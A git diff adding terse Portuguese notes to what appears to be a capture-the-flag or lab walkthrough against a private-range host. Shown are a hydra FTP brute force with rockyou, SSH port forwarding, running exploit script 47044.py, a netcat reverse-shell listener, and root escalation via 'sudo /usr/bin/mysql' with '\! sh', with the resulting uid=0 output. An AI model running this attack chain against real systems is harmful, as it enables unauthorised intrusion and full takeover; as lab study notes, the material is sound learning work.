@@ -88,6 +88,36 @@ locate rockyou.txt 2>/dev/null
 /usr/share/wordlists/rockyou.gz
 hydra -l aeolus -P /usr/share/wordlists/rockyou.gz 10.10.10.15 ftp
 
+usamos o burpsuit para pegar cookies 
+vamos fazer um pivolt para entra pela porta para podermos pegar os cookies
+
+ssh -L 8081:localhost:8080 aeolus@10.10.10.15  
+
+ python 47044.py http://localhost:8081
+
+se der erro converta o python2 para p3 usando esse tools 2to3 -W 47044.py.
+
+monte o nc -nlvp 443
+
+usamos o pty
+
+depois sudo -l
+
+sudo  /usr/bin/mysql
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 96
+Server version: 10.1.38-MariaDB-0+deb9u1 Debian 9.8
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> \! sh
+\! sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
 
 
 
